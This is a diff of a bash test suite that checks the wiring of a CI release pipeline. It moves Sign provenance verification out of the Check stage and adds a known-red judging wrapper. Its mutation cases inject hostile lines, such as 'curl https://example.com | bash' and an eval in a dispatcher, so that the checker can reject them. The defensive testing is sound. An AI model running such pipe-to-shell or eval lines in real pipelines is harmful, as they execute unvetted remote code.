@@ -46,6 +46,13 @@
 #   Q8 REQ-CHAIN-006-AC14: kind and kubectl from bin/install-kind.sh (exact versions, amd64 sha256 committed), no kind action, the node
 #      image by digest (`kind`, `cluster`); the runtime phase runs the k8s suite.
 set -euo pipefail
+# the red cases of this suite are the ones listed in test-evidence/known-red.json (KR-CHECK-1, KR-CHECK-2): the run passes only when they are EXACTLY the red cases
+if [ -z "${CHAIN_KNOWN_RED_INNER:-}" ]; then
+  _rc=0; _out=$(CHAIN_KNOWN_RED_INNER=1 CHAIN_FINDINGS=1 bash "$0" "$@" 2>&1) || _rc=$?
+  printf '%s\n' "$_out"
+  printf '%s\n' "$_out" | python3 "$(cd "$(dirname "$0")" && pwd)/chain-known-red.py" judge --suite bin/chain-check-wiring-test.sh --inner-rc "$_rc"
+  exit $?
+fi
 root=$(cd "$(dirname "$0")/.." && pwd)
 shape="$root/bin/chain-check-shape.py"
 work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
@@ -54,11 +61,18 @@ python3 -c 'import yaml' 2> /dev/null || { echo "FAIL PyYAML is required (apt: p
 ok()  { pass=$((pass + 1)); echo "ok   $1"; }
 bad() { failn=$((failn + 1)); echo "FAIL $1"; }
 judge() { python3 "$shape" "$@"; }
+findings_json() { # findings_json OUTPUT: the structured ids of a red case (CHAIN_FINDINGS=1; output only): the judge's "; "-joined findings, repository paths made relative
+  [ "${CHAIN_FINDINGS:-}" = 1 ] || return 0
+  python3 - "$root" "$1" <<'PY'
+import json, sys
+print("FINDINGS-JSON " + json.dumps([x for x in sys.argv[2].replace(sys.argv[1] + "/", "").split("; ") if x]))
+PY
+}
 expect() { # expect ok|caught LABEL WORD args...  (WORD: a word the fault message must contain, for caught)
   local want=$1 label=$2 word=$3; shift 3; local out rc=0
   out=$(judge "$@" 2>&1) || rc=$?
   if [ "$want" = ok ]; then
-    if [ "$rc" = 0 ]; then ok "$label"; else bad "$label -> $out"; fi
+    if [ "$rc" = 0 ]; then ok "$label"; else findings_json "$out"; bad "$label -> $out"; fi
   else
     if [ "$rc" = 1 ] && grep -Fq -- "$word" <<< "$out"; then ok "$label (caught: ${out:0:90})"; else bad "$label -> rc=$rc, wanted a refusal containing '$word': ${out:0:140}"; fi
   fi
@@ -87,7 +101,7 @@ stage = ("name: 'Stage: check'\non:\n  workflow_call:\npermissions:\n  contents:
          f"      - uses: {CHK}\n        with:\n          persist-credentials: false\n"
          "      - name: install Witness (pinned by checksum)\n        run: bash bin/install-scanner.sh witness\n"
          "      - name: install kind and kubectl (pinned by sha256)\n        run: bash bin/install-kind.sh\n"
-         + dn("witness-build", "witness-build") + dn("digests", "witness-build") + dn("provenance", "provenance") + dn("dist", "dist")
+         + dn("witness-build", "witness-build") + dn("digests", "witness-build") + dn("dist", "dist")
          + dn("images", "images")
          + wit("scanners") + wit("acceptance") + wit("runtime")
          + f"      - uses: {UPL}\n        with:\n          name: witness-check\n          path: |\n            witness-scanners\n            witness-acceptance\n            witness-runtime\n"
@@ -96,7 +110,7 @@ stage = ("name: 'Stage: check'\non:\n  workflow_call:\npermissions:\n  contents:
 stage += ("  check-arm64:\n    runs-on: ubuntu-24.04-arm\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n"
           f"      - uses: {CHK}\n        with:\n          persist-credentials: false\n"
           "      - name: install Witness (pinned by checksum)\n        run: bash bin/install-scanner.sh witness\n"
-          + dn("witness-build", "witness-build") + dn("digests", "witness-build") + dn("provenance", "provenance") + dn("dist", "dist") + dn("images", "images")
+          + dn("witness-build", "witness-build") + dn("digests", "witness-build") + dn("dist", "dist") + dn("images", "images")
           + "      - name: arm64 under Witness\n        run: bash bin/witnessed.sh arm64 bin/check-phase-arm64.sh\n"
           + up("witness-check-arm64", "witness-arm64"))
 open(w + "/stage.yml", "w").write(stage)
@@ -128,8 +142,7 @@ exec witness run --step "$step" \\
   --env-add-sensitive-key DOCKERHUB_TOKEN \\
   -o "witness-${step#snapshot-}/$step-collection.json" -- timeout 540 bash "$@"
 """)
-V = ["python3 -I -B bin/chain-verify.py stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json --policy policy.json",
-     "python3 -I -B bin/chain-verify.py verify --stage sign --record provenance/provenance.json --policy policy.json --rekor-stub provenance/provenance.rekor.json"]
+V = ["python3 -I -B bin/chain-verify.py stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json --policy policy.json"]
 PH = [("scanners", ["bash bin/check-scan.sh --scanners .github/policy/scanners.json --digests witness-build/digests.json --images images --archives dist --out check-results"]),
       ("acceptance", ["bash bin/check-acceptance.sh gradle --digests witness-build/digests.json --images images --out check-results",
                       "bash bin/check-acceptance.sh maven --digests witness-build/digests.json --images images --out check-results"]),
@@ -162,7 +175,7 @@ jobs:
     needs: build
     uses: ./.github/workflows/stage-reproducibility.yml
   check:
-    needs: [build, sign]
+    needs: build
     uses: ./.github/workflows/stage-verify.yml
   release:
     needs: [check, rebuild, sign]
@@ -223,24 +236,24 @@ armt() { # armt FILE LINE... : an arm64 target holding exactly these lines after
   local f=$1; shift; { printf '#!/usr/bin/env bash\n'; printf '%s\n' "$@"; } > "$f"; }
 P1="$ARMV policy make --template .github/policy/release-policy.template.json --tag \"\$GITHUB_REF_NAME\" --out policy.json"
 P2="$ARMV stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json --policy policy.json"
-P3="$ARMV verify --stage sign --record provenance/provenance.json --policy policy.json --rekor-stub provenance/provenance.rekor.json"
-armt "$work/ph_arm64.sh" "set -euo pipefail" "$P1" "$P2" "$P3" "$ARML"
-expect ok "fixture: the arm64 target passes the phase judge (rule 58: it verifies Build and Sign, then the artifact checks)" "" phase "$work/ph_arm64.sh" arm64
-armt "$work/ph_arm64b.sh" "set -euo pipefail" "$P1" "$P2" "$P3" "${ARML/ --arch arm64/}"
+P3="$ARMV verify --stage sign --record provenance/provenance.json --policy policy.json --rekor-stub provenance/provenance.rekor.json"   # Sign's provenance is Release's to verify (rule 58: Check's previous stage is Build)
+armt "$work/ph_arm64.sh" "set -euo pipefail" "$P1" "$P2" "$ARML"
+expect ok "fixture: the arm64 target passes the phase judge (rule 58: it verifies Build's record, then the artifact checks)" "" phase "$work/ph_arm64.sh" arm64
+armt "$work/ph_arm64b.sh" "set -euo pipefail" "$P1" "$P2" "${ARML/ --arch arm64/}"
 expect caught "AC17 an arm64 target without --arch arm64" "exactly" phase "$work/ph_arm64b.sh" arm64
-armt "$work/ph_arm64c.sh" "set -euo pipefail" "$P1" "$P2" "$P3" "$ARML || true"
+armt "$work/ph_arm64c.sh" "set -euo pipefail" "$P1" "$P2" "$ARML || true"
 expect caught "AC17 an arm64 target that swallows a failure" "exactly" phase "$work/ph_arm64c.sh" arm64
-armt "$work/ph_arm64d.sh" "set -euo pipefail" "$P1" "$P3" "$ARML"
+armt "$work/ph_arm64d.sh" "set -euo pipefail" "$P1" "$ARML"
 expect caught "rule 58 an arm64 target that does not verify Build's record (no stage-start)" "exactly" phase "$work/ph_arm64d.sh" arm64
-armt "$work/ph_arm64e.sh" "set -euo pipefail" "$P1" "$P2" "$ARML"
-expect caught "rule 58 an arm64 target that does not verify Sign's provenance" "exactly" phase "$work/ph_arm64e.sh" arm64
-armt "$work/ph_arm64f.sh" "set -euo pipefail" "$P1" "$P2" "$ARML" "$P3"
-expect caught "rule 58 an arm64 target that checks the artifacts before it verifies Sign" "exactly" phase "$work/ph_arm64f.sh" arm64
-armt "$work/ph_arm64g.sh" "set -euo pipefail" "$P1" "${P2/python3 -I -B/python3}" "$P3" "$ARML"
+armt "$work/ph_arm64e.sh" "set -euo pipefail" "$P1" "$P2" "$P3" "$ARML"
+expect caught "rule 58 an arm64 target that verifies Sign's provenance (Release's to verify)" "exactly" phase "$work/ph_arm64e.sh" arm64
+armt "$work/ph_arm64f.sh" "set -euo pipefail" "$P1" "$ARML" "$P2"
+expect caught "rule 58 an arm64 target that checks the artifacts before it verifies Build" "exactly" phase "$work/ph_arm64f.sh" arm64
+armt "$work/ph_arm64g.sh" "set -euo pipefail" "$P1" "${P2/python3 -I -B/python3}" "$ARML"
 expect caught "rule 58 an arm64 target whose verifier is not isolated" "exactly" phase "$work/ph_arm64g.sh" arm64
-armt "$work/ph_arm64h.sh" "set -euo pipefail" "$P1" "${P2/witness-build\/digests.json/other\/digests.json}" "$P3" "$ARML"
+armt "$work/ph_arm64h.sh" "set -euo pipefail" "$P1" "${P2/witness-build\/digests.json/other\/digests.json}" "$ARML"
 expect caught "rule 58 an arm64 target that verifies other digests than the ones it checks" "exactly" phase "$work/ph_arm64h.sh" arm64
-armt "$work/ph_arm64i.sh" "$P1" "$P2" "$P3" "$ARML"
+armt "$work/ph_arm64i.sh" "$P1" "$P2" "$ARML"
 expect caught "an arm64 target without set -euo pipefail" "exactly" phase "$work/ph_arm64i.sh" arm64
 expect ok "fixture: the known-good chain-records.json passes the records judge" "" records "$work/records.json"
 expect ok "fixture: the known-good release.yml passes the graph judge" "" graph "$work/release.yml"
@@ -267,8 +280,9 @@ m s_sec    'name: scanners'                                   'name: scanners\n 
 m s_login  '      - name: install Witness'                     '      - name: login\n        run: echo x | docker login ghcr.io -u u --password-stdin\n      - name: install Witness' 'registry login' "AC1 a registry login"
 m s_unp    'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' 'actions/checkout@v4'                                  'digest-pinned'    "AC1 an unpinned checkout"
 m s_persist 'persist-credentials: false'                       'persist-credentials: true'                              'persist-credentials' "AC1 persisted credentials"
-m s_dlname 'name: provenance'                                  'name: not-listed'                                       'download-artifact' "AC1 a download outside the allowlist"
-m s_dlbin  'path: provenance'                                  'path: bin'                                              'download-artifact' "AC1 a download into bin/"
+m s_prov   'name: dist\n          path: dist\n'                      'name: provenance\n          path: provenance\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: dist\n          path: dist\n' 'download-artifact' "rule 58 the Check job downloads Sign's provenance"
+m s_dlname 'name: images\n          path: images'                  'name: not-listed\n          path: images'                                       'download-artifact' "AC1 a download outside the allowlist"
+m s_dlbin  'path: dist'                                        'path: bin'                                              'download-artifact' "AC1 a download into bin/"
 m s_upname 'name: check-results'                               'name: anything'                                         'upload-artifact'   "AC1 an upload outside the allowlist"
 m s_ghscr  '      - name: install Witness'                     '      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1\n      - name: install Witness' 'uses not allowed' "AC1 github-script"
 m s_comp   '      - name: install Witness'                     '      - uses: ./.github/actions/x\n      - name: install Witness'  'uses not allowed' "AC1 a local composite action"
@@ -301,7 +315,8 @@ m a_sec    'name: arm64 under Witness\n'                       'name: arm64 unde
 m a_extra  'name: arm64 under Witness\n'                       'name: extra\n        run: bash bin/install-kind.sh\n      - name: arm64 under Witness\n' 'check-arm64' "AC1 an extra step in the arm64 job"
 m a_nokind '      - name: arm64 under Witness\n        run: bash bin/witnessed.sh arm64 bin/check-phase-arm64.sh\n' '' 'check-arm64' "AC1 the arm64 job without its witnessed step"
 m a_noinst '      - name: install Witness \(pinned by checksum\)\n        run: bash bin/install-scanner.sh witness\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: witness-build\n          path: witness-build\n' '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: witness-build\n          path: witness-build\n' 'check-arm64' "AC1 the arm64 job without the Witness install"
-m a_nowb   '          name: witness-build\n          path: witness-build\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: digests\n          path: witness-build\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: provenance\n          path: provenance\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: dist\n          path: dist\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: images\n          path: images\n      - name: arm64' '          name: digests\n          path: witness-build\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: provenance\n          path: provenance\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: dist\n          path: dist\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: images\n          path: images\n      - name: arm64' 'check-arm64' "rule 58 the arm64 job without the Build record download"
+m a_nowb   '          name: witness-build\n          path: witness-build\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: digests\n          path: witness-build\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: dist\n          path: dist\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: images\n          path: images\n      - name: arm64' '          name: digests\n          path: witness-build\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: dist\n          path: dist\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: images\n          path: images\n      - name: arm64' 'check-arm64' "rule 58 the arm64 job without the Build record download"
+m a_prov   'name: images\n          path: images\n      - name: arm64' 'name: images\n          path: images\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: provenance\n          path: provenance\n      - name: arm64' 'check-arm64' "rule 58 the arm64 job downloads Sign's provenance"
 m a_stepwhat 'run: bash bin/witnessed.sh arm64 bin/check-phase-arm64.sh' 'run: bash bin/witnessed.sh arm64 bin/check-phase-runtime.sh' 'check-arm64' "AC1 the arm64 step with another target"
 m a_stepname 'run: bash bin/witnessed.sh arm64 bin/check-phase-arm64.sh' 'run: bash bin/witnessed.sh scanners bin/check-phase-scanners.sh' 'check-arm64' "AC1 the arm64 job running another step"
 m a_upname 'name: witness-check-arm64'                         'name: check-results'                                    'check-arm64'       "AC1 the arm64 upload under another artifact name"
@@ -354,8 +369,8 @@ sm c_nopol   'python3 -I -B bin/chain-verify.py policy make[^\n]*\n'   ''       
 sm c_poltag  '--tag "\$GITHUB_REF_NAME"'                       '--tag v0.3.0'                                           'not the pinned form' "AC3 the policy made for a fixed tag instead of the run's tag (Q5)"
 sm c_noiso   'python3 -I -B bin/chain-verify.py stage-start'  'python3 bin/chain-verify.py stage-start'                'not the pinned form' "AC3 the verifier not isolated (PR 1: python3 -I -B)"
 sm c_nok8s   'bash bin/check-acceptance.sh k8s[^\n]*\n'       ''                                                       'not the pinned form' "AC14 the k8s suite dropped from the runtime phase"
-sm c_nosign  'python3 -I -B bin/chain-verify.py verify --stage sign[^\n]*\n' ''                                               'not the pinned form' "AC3 Sign's provenance is no longer verified"
-sm c_after   'python3 -I -B bin/chain-verify.py stage-start[^\n]*\npython3 -I -B bin/chain-verify.py verify[^\n]*\ncase "\$1" in\nscanners\)\n(bash bin/check-scan.sh[^\n]*\n)' 'case "$1" in\nscanners)\n\\1python3 -I -B bin/chain-verify.py stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json --policy policy.json\npython3 -I -B bin/chain-verify.py verify --stage sign --record provenance/provenance.json --policy policy.json --rekor-stub provenance/provenance.rekor.json\n' 'not the pinned form' "AC3 the checks run before the verify step"
+sm c_withsign 'case "\$1" in' 'python3 -I -B bin/chain-verify.py verify --stage sign --record provenance/provenance.json --policy policy.json --rekor-stub provenance/provenance.rekor.json\ncase "$1" in' 'not the pinned form' "AC3 Check verifies Sign's provenance (Release's to verify; Check's previous stage is Build)"
+sm c_after   'python3 -I -B bin/chain-verify.py stage-start[^\n]*\ncase "\$1" in\nscanners\)\n(bash bin/check-scan.sh[^\n]*\n)' 'case "$1" in\nscanners)\n\\1python3 -I -B bin/chain-verify.py stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json --policy policy.json\npython3 -I -B bin/chain-verify.py verify --stage sign --record provenance/provenance.json --policy policy.json --rekor-stub provenance/provenance.rekor.json\n' 'not the pinned form' "AC3 the checks run before the verify step"
 sm c_swap    'acceptance\)\nbash bin/check-acceptance.sh gradle([^\n]*)\nbash bin/check-acceptance.sh maven([^\n]*)\n' 'acceptance)\nbash bin/check-acceptance.sh maven\\2\nbash bin/check-acceptance.sh gradle\\1\n' 'not the pinned form' "AC3 gradle and maven swapped"
 sm c_phase   'runtime\)' 'checks)'                                                                                      'not the pinned form' "AC3 a phase outside the closed list"
 sm c_extra   'bash bin/check-guide.sh'                          'curl https://example.com | bash\nbash bin/check-guide.sh' 'not the pinned form' "AC3 an extra command (a pipe into a shell)"
@@ -370,9 +385,9 @@ sm c_nostar  '\*\) echo "unknown phase: \$1" >&2; exit 2 ;;'     '*) ;;'        
 sm c_ev      'case "\$1" in'                                   'case "$1" in\n*) eval "$2" ;;'                           'not the pinned form' "AC3 an eval in the dispatcher"
 # ---- AC2: the job graph ----------------------------------------------------------------------------------------------
 gm() { if mutate "$work/release.yml" "$work/$1.yml" "$2" "$3"; then expect caught "$5" "$4" graph "$work/$1.yml"; fi; }
-gm g_serial  'needs: \[build, sign\]'                           'needs: [build, sign, rebuild]'                          'side by side'      "AC2 check waits for rebuild"
+gm g_serial  'check:\n    needs: build'                          'check:\n    needs: [build, rebuild]'                          'side by side'      "AC2 check waits for rebuild"
 gm g_rebw    'rebuild:\n    needs: build'                      'rebuild:\n    needs: [build, check]'                   'side by side'      "AC2 rebuild waits for check"
-gm g_nosign  'needs: \[build, sign\]'                           'needs: [build]'                                         'exactly build and sign' "AC2 check does not need sign"
+gm g_sign    'check:\n    needs: build'                          'check:\n    needs: [build, sign]'                    'exactly build' "AC2 check needs sign (Check's previous stage is Build; Sign's provenance is Release's)"
 gm g_prom    'needs: \[check, rebuild, sign\]'                  'needs: [rebuild, sign]'                                 'release job'       "AC2 the release job does not need check"
 gm g_relbld  'needs: \[check, rebuild, sign\]'                  'needs: [build, check, rebuild, sign]'                   'exactly'           "AC2 the release job also lists build (redundant: check needs build; PR 2 pins exactly check, rebuild, sign)"
 gm g_promo   '  release:\n'                                    '  promotion:\n'                                       'no job release'    "AC2 the last stage's job named promotion (the ratified name is release, Q9)"
@@ -476,7 +491,7 @@ expect ok "the real bin/check-stage.sh verifies, then dispatches scanners / acce
 for s in scanners acceptance runtime arm64; do expect ok "the real bin/check-phase-$s.sh is the one line of its phase (AC1, AC3)" "" phase "$root/bin/check-phase-$s.sh" "$s"; done
 expect ok "the real bin/witnessed.sh is the one helper with the Witness flags and the 9-minute cap (rule 68)" "" helper "$root/bin/witnessed.sh"
 expect ok "the real chain-records.json has Check's Witness collection and no old acceptance record (rule 66)" "" records "$root/.github/policy/chain-records.json"
-expect ok "the real release.yml runs check beside rebuild, check needs build and sign, and the release job needs exactly check, rebuild and sign" "" graph "$root/.github/workflows/release.yml"
+expect ok "the real release.yml runs check beside rebuild, check needs build only, and the release job needs exactly check, rebuild and sign" "" graph "$root/.github/workflows/release.yml"
 expect ok "the real check scripts are plain (check-stage.sh is judged by script alone, Q3)" "" plain "$root"/bin/check-scan.sh "$root"/bin/check-fips.sh "$root"/bin/check-artifacts.sh "$root"/bin/check-acceptance.sh "$root"/bin/check-guide.sh
 expect ok "the real check scripts are listed in chain-scripts.json with their sha256" "" listed "$root/.github/policy/chain-scripts.json" "$root"
 expect ok "the old acceptance stages are gone from the real repository and release.yml" "" removed "$root"
@@ -484,7 +499,7 @@ expect ok "the real bin/install-kind.sh installs kind v0.33.0 and kubectl v1.37.
 expect ok "the real k8s suite creates its cluster with the node image by digest (AC14)" "" cluster "$root/bin/acceptance-k8s.sh"
 expect ok "the real acceptance.yml runs the shared gradle and maven suite scripts (AC5)" "" suites "$root/.github/workflows/acceptance.yml"
 expect ok "rule 79 on the real guide: it exists and its cannot-run list is a valid exact-text list (AC7; RED until cache-3f's guide exists)" "" guidelist "$root/docs/verify-release.md"
-EXPECT=191
+EXPECT=193
 echo "pass=$pass fail=$failn"
 if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
 [ "$failn" = 0 ]
